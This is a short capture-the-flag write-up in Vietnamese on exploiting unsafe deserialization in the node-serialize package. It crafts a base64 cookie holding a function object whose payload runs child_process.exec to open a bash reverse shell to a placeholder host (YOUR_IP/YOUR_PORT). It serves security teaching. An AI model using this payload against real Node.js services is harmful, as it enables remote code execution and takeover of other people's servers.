# Node - Serialize (Medium - 35 pts)

Chi tiết về Node - Serialize: https://www.npmjs.com/package/node-serialize

![image](https://user-images.githubusercontent.com/83667873/153467323-fceb7e3c-c77f-4fea-b739-5c3da1e478fa.png)

Ở trong challenge này chúng ta sẽ thấy có một form login, nhập giá trị tùy ý sau đó kiểm tra cookie:

![image](https://user-images.githubusercontent.com/83667873/153467666-23af8c97-1eda-4a3b-bb57-303aa23c3f0b.png)

Thực hiện base64-decode giá trị này, chúng ta sẽ nhận được một object đang bị serialize. Có lẽ ở phía server sẽ thực hiện unserialize object này sau đó thực hiện kiểm tra với password và username xem có trùng khớp hay không.

![image](https://user-images.githubusercontent.com/83667873/153468453-37acac4d-61dc-43d4-9f64-8a5f2236986c.png)

Dù thế nào thì mục đích của chúng ta cũng là có thể thực hiện RCE. Xem xét thì mình thấy bài này chúng ta không xem được kết quả trực tiếp nên mình sẽ chọn thực hiện theo hướng dùng reverse shell.

Reverse shell mà mình sẽ sử dụng:

```
require("child_process").exec('bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"')
```

Vì mục đích của mình là sau khi unserialize thì object nó sẽ có dạng như:

```
{userName:"hi", passWord: function(){require('child_process').exec('bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"', function(error, stdout, stderr) { console.log(stdout) });} }
```
Nên là mình sẽ thực hiện serialize một object mẫu để lấy payload:

![image](https://user-images.githubusercontent.com/83667873/153472443-eac22fa5-01ee-47a9-b813-be27d28fa5e2.png)

![image](https://user-images.githubusercontent.com/83667873/153472557-db8d74fb-ee9a-4f55-acce-89f599c56c03.png)

Thực hiện base64-encode giá trị trên và thay giá trị cookie thành giá trị này chúng ta sẽ thành công thực hiện được reverse shell:

![image](https://user-images.githubusercontent.com/83667873/153472737-692f9e00-cebc-4d8c-b5fd-cc49445a43d3.png)



